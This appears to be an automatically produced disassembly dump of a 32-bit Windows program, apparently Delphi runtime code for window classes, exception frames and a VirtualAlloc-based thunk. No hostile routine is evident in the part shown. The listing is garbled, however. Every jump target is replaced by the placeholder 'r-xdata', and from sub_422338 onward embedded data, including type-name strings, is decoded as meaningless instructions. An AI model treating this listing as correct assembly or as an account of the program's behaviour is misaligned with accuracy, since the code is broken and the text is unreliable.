sub_421918
push ebx
push esi
push edi
call sub_403508
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_421018
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_4212cc
jmp r-xdata
mov eax esi
call sub_418698
mov edx eax
mov eax edi
call sub_421a58
lea eax [ edi + 0x50 ]
call sub_40d130
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4034f0
sub_421978
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4212e8
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_4219a4
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_4219c0
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_4219dc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_4185b0
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_421a58
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_4184a0
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_4185b0
cmp ebp eax
jne r-xdata
sub_421a98
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_4212cc
mov edx ebx
call sub_42109c
sub_421ac4
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403124
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_421b0c
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403144
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_403154
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_421b44
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_421b93
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_421bac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_421bfb
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_421c14
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_421c7e
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_421c98
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_421ce1
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_41ab48
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_421cfc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_405830
xor eax eax
push ebp
push sub_421ee9
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_421ec2
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4026dc
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_421eb1
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026fc
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_4039b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421ef0
lea eax [ ebp + 0xc ]
call sub_4057bc
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_4039b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_421f2c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_421f8f
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_421fc0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_418974
mov edi eax
xor eax eax
push ebp
push sub_422015
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42201c
mov eax [ rw-data ]
call sub_4189d8
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4185b0
call sub_403154
inc esi
dec ebx
jne r-xdata
sub_422034
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_42205c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4028d8
mov edx sub_422034
lea eax [ esi + 0x5 ]
call sub_422054
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_422054
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_422118
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_406b6c
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42205c
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_4221cc
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4220f4
sub_4221f4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_422298
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42229f
retn
mov eax [ rw-data ]
call sub_417b98
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_421fc0
xor edx edx
xor eax eax
call sub_41baac
mov eax rw-data
call sub_40d130
call sub_405eec
lea eax [ eax + 0xc ]
call sub_40d130
mov eax rw-data
call sub_40d130
mov eax rw-data
call sub_4057bc
mov eax sub_42202c
call sub_405658
mov eax rw-data
call sub_40d130
call sub_420834
mov eax rw-data
call sub_40d130
mov eax rw-data
call sub_4057bc
sub_4222a4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42232d
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422334
retn
call sub_420800
mov eax sub_42202c
call sub_405650
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ce70
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_4057d4
mov dl 0x1
mov eax [ r-xdata ]
call sub_417460
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41881c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41881c
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_422338
xchg esi eax
dec eax
add [ edi + edi * 8 - 0x699c0000 ] cl
dec eax
add [ ebp + 0x640000ff ] cl
xchg esi eax
dec eax
add [ esi + 0x640000ff ] cl
xchg esi eax
dec eax
add [ edi + 0x640000ff ] cl
xchg esi eax
dec eax
add [ eax - 0x1 ] dh
add [ eax ] al
xchg esi eax
dec eax
add [ ecx - 0x1 ] dh
add [ eax ] al
xchg esi eax
dec eax
add [ edx - 0x1 ] dh
add [ eax ] al
xchg esi eax
dec eax
add [ ebx - 0x1 ] dh
add [ eax ] al
xchg esi eax
dec eax
add [ edi + edi * 8 ] dh
add [ esi + edx * 4 + 0x48 ] ah
add [ ebp - 0x1 ] dh
add [ eax ] al
xchg esi eax
dec eax
add [ esi - 0x1 ] dh
add [ eax ] al
xchg esi eax
dec eax
add [ edi - 0x1 ] dh
add [ eax ] al
xchg esi eax
dec eax
add [ eax - 0x1 ] bh
add [ eax ] al
xchg esi eax
dec eax
add [ ecx - 0x1 ] bh
add [ eax ] al
xchg esi eax
dec eax
add [ edx - 0x1 ] bh
add [ eax ] al
xchg esi eax
dec eax
add [ ebx - 0x1 ] bh
add [ eax ] al
xchg esi eax
dec eax
add [ edi + edi * 8 ] bh
add [ esi + edx * 4 + 0x48 ] ah
add [ ebp - 0x1 ] bh
add [ eax ] al
xchg esi eax
dec eax
add [ esi - 0x1 ] bh
add [ eax ] al
xchg esi eax
dec eax
add [ edi - 0x1 ] bh
add [ eax ] al
xchg esi eax
dec eax
add [ eax - 0x1 ] ah
add [ eax ] al
xchg esi eax
dec eax
add [ ecx - 0x1 ] ah
add [ eax ] al
xchg esi eax
dec eax
add [ edx - 0x1 ] ah
add [ eax ] al
xchg esi eax
dec eax
add [ ebx - 0x1 ] ah
add [ eax ] al
xchg esi eax
dec eax
add [ edi + edi * 8 ] ah
add [ esi + edx * 4 + 0x48 ] ah
add [ ebp - 0x1 ] ah
add [ eax ] al
xchg esi eax
dec eax
add [ esi - 0x1 ] ah
add [ eax ] al
xchg esi eax
dec eax
add [ edi - 0x1 ] ah
add [ eax ] al
xchg esi eax
dec eax
add [ eax - 0x1 ] ch
add [ eax ] al
xchg esi eax
dec eax
add [ ecx - 0x1 ] ch
add [ eax ] al
xchg esi eax
dec eax
add [ edx - 0x1 ] ch
add [ eax ] al
xchg esi eax
dec eax
add [ ebx - 0x1 ] ch
add [ eax ] al
xchg esi eax
dec eax
add [ edi + edi * 8 ] ch
add [ esi + edx * 4 + 0x48 ] ah
add [ ebp - 0x1 ] ch
add [ eax ] al
xchg esi eax
dec eax
add [ esi - 0x1 ] ch
add [ eax ] al
xchg esi eax
dec eax
add [ edi - 0x1 ] ch
add [ eax ] al
xchg esi eax
dec eax
add [ eax - 0x1 ] dl
add [ eax ] al
xchg esi eax
dec eax
add [ ecx - 0x1 ] dl
add [ eax ] al
xchg esi eax
dec eax
add [ edx - 0x1 ] dl
add [ eax ] al
xchg esi eax
dec eax
add [ ebx - 0x1 ] dl
add [ eax ] al
xchg esi eax
dec eax
add [ edi + edi * 8 ] dl
add [ esi + edx * 4 + 0x48 ] ah
add [ ebp - 0x1 ] dl
add [ eax ] al
xchg esi eax
dec eax
add [ esi - 0x1 ] dl
add [ eax ] al
xchg esi eax
dec eax
add [ edi - 0x1 ] dl
add [ eax ] al
xchg esi eax
dec eax
add [ eax - 0x1 ] bl
add [ eax ] al
xchg esi eax
dec eax
add [ ecx - 0x1 ] bl
add [ eax ] al
xchg esi eax
dec eax
add [ edx - 0x1 ] bl
add [ eax ] al
xchg esi eax
dec eax
add [ ebx - 0x1 ] bl
add [ eax ] al
xchg esi eax
dec eax
add [ edi + edi * 8 ] bl
add [ esi + edx * 4 + 0x48 ] ah
add [ ebp - 0x1 ] bl
add [ eax ] al
xchg esi eax
dec eax
add [ esi - 0x1 ] bl
add [ eax ] al
xchg esi eax
dec eax
add [ edi - 0x1 ] bl
add [ eax ] al
xchg esi eax
dec eax
add [ eax - 0x1 ] al
add [ eax ] al
xchg esi eax
dec eax
add [ ecx - 0x1 ] al
add [ eax ] al
xchg esi eax
dec eax
add [ edx - 0x1 ] al
add [ eax ] al
xchg esi eax
dec eax
add [ ebx - 0x1 ] al
add [ eax ] al
xchg esi eax
dec eax
add [ edi + edi * 8 ] al
add [ esi + edx * 4 + 0x48 ] ah
add [ ebp - 0x1 ] al
add [ eax ] al
xchg esi eax
dec eax
add [ esi - 0x1 ] al
add [ eax ] al
xchg esi eax
dec eax
add [ edi - 0x1 ] al
add [ eax ] al
xchg esi eax
dec eax
add [ eax - 0x1 ] cl
add [ eax ] al
xchg esi eax
dec eax
add [ ecx - 0x1 ] cl
add [ eax ] al
xchg esi eax
dec eax
add [ edx - 0x1 ] cl
add [ eax ] al
xchg esi eax
dec eax
add [ ebx - 0x1 ] cl
add [ eax ] al
xchg esi eax
dec eax
add [ edi + edi * 8 ] cl
add [ esi + edx * 4 + 0x48 ] ah
add [ ebp - 0x1 ] cl
add [ eax ] al
xchg esi eax
dec eax
add [ esi - 0x1 ] cl
add [ eax ] al
xchg esi eax
dec eax
add [ edi - 0x1 ] cl
add [ eax ] al
xchg esi eax
dec eax
add [ eax ] dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ ecx ] dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edx ] dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ ebx ] dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edi + edi * 8 ] dh
add [ eax ] al
xchg esi eax
dec eax
add [ 0x640000ff ] dh
xchg esi eax
dec eax
add [ esi ] dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edi ] dh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ eax ] bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ ecx ] bh
inc [ eax ]
add [ esi + edx * 4 + 0x48 ] ah
add [ edx ] bh
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4225d5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4225dc
retn
sub_4225ec
add [ esi ] eax
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
dec esp
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x42 ] cl
add [ eax + eax ] cl
add [ eax ] al
lodsb [ esi ]
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004226 ] ch
add [ eax ] al
add [ eax + esi * 2 + 0x33840040 ] ch
inc eax
add [ eax - 0x6bffbfcd ] dl
xor eax [ eax ]
cwde
xor eax [ eax ]
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
xor [ eax ] eax
cmovne ecx [ ecx + 0x6e ]
jbe r-xdata
popad
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ eax + 0x4226 ] bp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
imul esp [ ebx + 0x4f ] 0x61726570
je r-xdata
jb r-xdata
push 0x65737261
je r-xdata
outsd
outsb
lea eax [ eax ]
enter 0x4226 0x0
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
cmp [ edi ] ah
inc edx
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add ah al
inc edx
add [ ecx ] cl
jo r-xdata
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
je r-xdata
popa
jne r-xdata
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
daa
inc edx
add [ ebx + 0x4227a0c0 ] cl
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
xor al 0x27
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edi ] dh
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
outsd
je r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0x2788c08b
inc edx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ edi + 0x70070042 ] bl
or al 0x70
jae r-xdata
jo r-xdata
outsd
push es
jo r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
add [ eax ] al
add [ eax ] al
mov al 0x29
inc edx
add [ eax ] al
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x42280890
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp + 0x299c0042 ] dl
inc edx
add [ gs : eax ] eax
add [ eax ] al
push 0x6c797453
rol ah 0x28
push 0x8b736369
push eax
outsb
dec esi
outsd
insd
outsd
jo r-xdata
dec esi
outsd
je r-xdata
dec esi
outsd
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
insd
push edi
push 0x5657469
jo r-xdata
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add [ eax + ebp ] al
inc edx
add [ edi ] al
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
jo r-xdata
pop es
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
inc edx
add [ esi ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
xor al 0x27
popad
jb r-xdata
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add al al
sub [ edx ] al
dec ebp
jb r-xdata
je r-xdata
insd
inc esi
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
pop es
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
jb r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
jae r-xdata
popad
jae r-xdata
push es
dec ebp
push eax
outsb
insb
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
pop eax
dec esi
jo r-xdata
inc esp
outsd
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
jo r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
imul esp [ ebx + 0x73 ] 0x42270c90
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
outsb
je r-xdata
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
or [ ebx - 0x736fffbf ] 0x41
add [ eax - 0x53ffbe74 ] bl
mov eax [ ecx ]
add [ eax ] eax
std
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
inc edx
add [ eax ] bl
add [ eax ] al
add [ eax - 0x7bffbea3 ] bl
xor eax [ eax ]
nop
xor eax [ eax ]
xchg esp eax
xor eax [ eax ]
cwde
xor eax [ eax ]
jpe r-xdata
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
